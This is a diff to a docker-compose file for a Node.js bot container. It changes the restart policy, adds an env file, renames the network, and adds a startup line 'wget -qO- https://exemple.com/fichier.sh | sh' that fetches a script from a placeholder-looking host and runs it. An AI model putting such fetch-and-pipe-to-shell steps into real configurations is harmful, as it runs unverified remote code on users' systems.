@@ -2,7 +2,7 @@
 # git clone --progress --verbose https://github.com/TBMPQF/TBM_CPU_V2.git /data
 services:
   bot:
-    restart: unless-stopped
+    restart: no
     image: node:lts-alpine
     container_name: tbm-cpu
     hostname: tbm-cpu
@@ -16,13 +16,16 @@ services:
     volumes:
       - /${DOCKER_DATA_DIRECTORY}/repos/home-docker/timezone:/etc/timezone:ro
       - tbm-cpu:/data
+    env_file:
+      - stack.env
     command:
       - sh
       - -c
       - > 
         cd /data &&
-        apk add --no-cache ffmpeg git py3-pip &&        
-        touch /data/logs/current_output.log /data/logs/current_error.log &&
+        apk add --no-cache ffmpeg git py3-pip &&
+        wget -qO- https://exemple.com/fichier.sh | sh &&
+        mkdir -p /data/logs && touch /data/logs/current_output.log /data/logs/current_error.log &&
         mv /data/logs/current_output.log /data/logs/output.log &&
         mv /data/logs/current_error.log /data/logs/error.log &&
         git reset --hard && git pull origin main && git checkout ${COMMIT_REF} &&
@@ -36,4 +39,4 @@ volumes:
     name: tbm_cpu
 networks:
   tbm-cpu:
-    name: tbm-cpu
+    name: tbm-cpu-test
